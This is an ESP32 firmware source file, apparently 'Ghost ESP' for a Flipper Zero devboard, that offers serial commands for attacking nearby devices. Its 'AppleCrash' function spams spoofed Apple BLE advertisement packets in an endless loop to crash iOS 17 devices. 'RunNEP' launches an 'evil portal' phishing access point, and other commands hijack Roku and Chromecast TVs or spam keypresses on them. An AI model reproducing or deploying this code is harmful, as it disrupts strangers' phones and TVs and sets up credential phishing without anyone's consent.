#include <WiFi.h>
#include "flipperLED.h"
#include "CommandLine.h"
#include "YoutubeController.h"
#include "RokuController.h"
#include "ESPmDNSHelper.h"
#include "RabbitTests.h"
#include "EvilPortal.h"
#include <Update.h>

#include "Dial.h"

flipperLED led;
EvilPortal Portal;

//#define DEVBOARDPRO
#define DEVBOARD

#ifdef DEVBOARD
#define SD_PIN 10
#endif

#ifdef DEVBOARDPRO
#define SD_PIN 4
#define SUPPORTS_BLE true
#endif

#ifdef SUPPORTS_BLE
#include <NimBLEDevice.h>
#include <NimBLEUtils.h>
#include <NimBLEServer.h>
#endif

#ifdef SUPPORTS_BLE
BLEAdvertisementData getOAdvertisementData() {
  BLEAdvertisementData randomAdvertisementData = BLEAdvertisementData();
  uint8_t packet[17];
  uint8_t size = 17;
  uint8_t i = 0;

  packet[i++] = size - 1;  // Packet Length
  packet[i++] = 0xFF;      // Packet Type (Manufacturer Specific)
  packet[i++] = 0x4C;      // Packet Company ID (Apple, Inc.)
  packet[i++] = 0x00;      // ...
  packet[i++] = 0x0F;      // Type
  packet[i++] = 0x05;      // Length
  packet[i++] = 0xC1;      // Action Flags
  const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
  packet[i++] = types[rand() % sizeof(types)];  // Action Type
  packet[i++] = rand() % 256;
  packet[i++] = rand() % 256;
  packet[i++] = rand() % 256;  // Authentication Tag
  packet[i++] = 0x00;          // ???
  packet[i++] = 0x00;          // ???
  packet[i++] = 0x10;          // Type ???
  packet[i++] = rand() % 256;
  packet[i++] = rand() % 256;
  packet[i++] = rand() % 256;

  randomAdvertisementData.addData(std::string((char*)packet, 17));
  return randomAdvertisementData;
}
#endif


void YTConnect(const char* YTURL, const char* SSID, const char* Password) {
  YoutubeController* YtController = new YoutubeController();

  DIALClient* dial = new DIALClient(YTURL, SSID, Password, YtController);

  led.TurnPurple();

  dial->Execute();

  led.offLED();

  delete YtController;
  delete dial;
}

void StartEvilPortal() {
  Portal.begin();
}


void YTChromeConnectToTarget(const char* SSID, const char* Password, const char* DeviceTarget, const char* URL) {
  led.TurnPurple();
  ESPmDNSHelper* CCTargeter = new ESPmDNSHelper(SSID, Password, DeviceTarget, URL, "233637DE");

  delete CCTargeter;
}

void YTChromeConnectEasy(const char* SSID, const char* Password, const char* URL) {
  led.TurnPurple();
  ESPmDNSHelper* CCTargeter = new ESPmDNSHelper(SSID, Password, "", URL, "233637DE");

  delete CCTargeter;
}

void RokuKeySpam(const char* SSID, const char* Password) {
  RokuController* RKController = new RokuController();

  const char* EmptyURL = "";

  led.TurnPurple();

  Serial.println(SSID);
  Serial.println(Password);

  DIALClient* dial = new DIALClient(EmptyURL, SSID, Password, RKController);

  dial->ShouldRokuKeySpam = true;

  dial->Execute();

  led.offLED();

  delete RKController;
  delete dial;
}

void AppleCrash() {
#ifdef SUPPORTS_BLE

  BLEDevice::init("");

  BLEServer* pServer = BLEDevice::createServer();

  BLEAdvertising* pAdvertising = pServer->getAdvertising();
  pAdvertising->setAdvertisementType(4);

  while (true) {
    delay(45);
    BLEAdvertisementData advertisementData = getOAdvertisementData();
    pAdvertising->setAdvertisementData(advertisementData);
    pAdvertising->start();
    delay(20);
    pAdvertising->stop();
    delay(2000); // 2 second delay TODO make this a parameter
  }

#endif
}

void UpdateESP(const char* UnusedParam) {
  File updateBin = SD.open("/update.bin");

  if (updateBin) {
    size_t updateSize = updateBin.size();

    if (updateSize > 0) {
      Serial.println(F("Starting update over SD. Please wait..."));

      if (Update.begin(updateSize)) {
        size_t written = Update.writeStream(updateBin);

        if (written == updateSize) {
          Serial.println("Written : " + String(written) + " successfully");
        } else {
          Serial.println("Written only : " + String(written) + "/" + String(updateSize) + ". Retry?");
        }

        if (Update.end()) {
          if (Update.isFinished()) {
            Serial.println(F("Update successfully completed. Rebooting."));
            updateBin.close();
            delay(1000);
            ESP.restart();
          } else {
            Serial.println("Update not finished? Something went wrong!");
          }
        }
      } else {
        Serial.println("Error Occurred. Error #: " + String(Update.getError()));
        updateBin.close();
      }
    }
  } else {
    Serial.println(F("Could not load update.bin from sd root"));
  }
}

void RokuConnect(const char* SSID, const char* Password, const char* ServiceName) {
  RokuController* RKController = new RokuController();


  if (String(ServiceName) == "youtube") {
    RKController->AppIDToLaunch = "837";
  }


  const char* EmptyURL = "";

  led.TurnPurple();

  Serial.println(SSID);
  Serial.println(Password);

  DIALClient* dial = new DIALClient(EmptyURL, SSID, Password, RKController);

  dial->ShouldRokuKeySpam = false;

  dial->Execute();

  led.offLED();

  delete RKController;
  delete dial;
}

void RunNEP(const char* Path, const char* SSID) {
  strncpy(Portal.HTML, Path, strlen(Path));
  strncpy(Portal.ssid, SSID, strlen(SSID));
  Portal.begin();
}

void RickRollTV(const char* SSID, const char* Password) {
  YoutubeController* YtController = new YoutubeController();

  const char* EmptyURL = "";

  led.TurnPurple();

  Serial.println(SSID);
  Serial.println(Password);

  DIALClient* dial = new DIALClient(EmptyURL, SSID, Password, YtController);

  dial->Execute();

  led.offLED();

  delete YtController;
  delete dial;
}

Command<const char*, const char*, const char*, const char*> cmd4("ChromeConnectYT", "Connect using YTChrome With Target. Usage: YTChromeConnect <SSID> <Password> <DeviceTarget> <ID>", YTChromeConnectToTarget);
Command<const char*, const char*, const char*> cmd5("RokuConnect", "Connect to Roku Launching Any Service (make sure the service is in lowercase) <SSID> <PASSWORD> <Service>", RokuConnect);
Command<const char*, const char*> cmd6("RokuKeySpam", "More Annoying than Anything. (Args <SSID> <PASSWORD>", RokuKeySpam);
Command<const char*, const char*> cmd7("RunNEP", "Native Evil Portal Args <Directory of HTML FILE> <SSID>", RunNEP);
Command<const char*> cmd8("update", "Update ESP32 to a new Bin", UpdateESP);
Command<> cmd9("applecrash", "Crash Apple Devices on IOS 17 Credit to WillyJL and ECTO-1A.", AppleCrash);
Command<const char*, const char*, const char*> cmd1("YTVConnect", "Connect to YouTube. Usage: YTConnect <ID> <SSID> <Password>", YTConnect);
Command<const char*, const char*> cmd2("RickRollTV", "Rickroll a TV. Usage: RickRollTV <SSID> <Password>", RickRollTV);
Command<const char*, const char*, const char*> cmd3("ChromeConnectEZYT", "Connect to Youtube Easily Usage: YTChromeConnectEasy <SSID> <Password> <ID>", YTChromeConnectEasy);
const int numCommands = 7;
CommandBase* commands[MAX_COMMANDS] = { &cmd1, &cmd2, &cmd3, &cmd4, &cmd5, &cmd6, &cmd7 };
CommandLine commandli(commands, numCommands);

void loop() {
  Portal.loop(commandli);
  delay(100);
}

void LoopTask(void* parameter) {
  while (true) {
    if (ShouldMultithread) {
      Portal.loop(commandli);
    }
    vTaskDelay(1000 / portTICK_PERIOD_MS);  // Run every second
  }
}

void setup() {
  Serial.begin(115200);

  Serial.println("ESP-IDF version is: " + String(esp_get_idf_version()));
  Serial.println(F("Welcome to Ghost ESP Made by Spooky"));

  pinMode(SD_PIN, OUTPUT);

  if (!SD.begin(SD_PIN)) {
    Serial.println(F("Failed to mount SD Card"));
    return;
  } else {
    Serial.println(F("SD Card Successfully Mounted"));
  }

#ifdef DEVBOARD
  led.RunSetup();
#endif

  xTaskCreatePinnedToCore(LoopTask, "LoopTask", 20000, NULL, 1, NULL, 1);
}
